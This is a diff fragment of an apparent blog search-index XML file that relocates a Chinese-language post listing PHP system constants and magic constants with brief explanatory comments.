+<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
+<p>由<code>__xxx__</code>形式构成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -3350,33 +3377,6 @@
 
 <p>这个变量主要是用于</p>
 <p>​    在局部范围不可以使用全局变量的时候有需要使用该变量的值，此时就可以用它来取得该全局变量的值。</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php中的系统常量</title>
-    <url>//php_systemVar.html</url>
-    <content><![CDATA[<p>php中的常量</p>
-<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
-<a id="more"></a>
-
-
-
-<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
-<p>由<code>__xxx__</code>形式构成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>web</category>
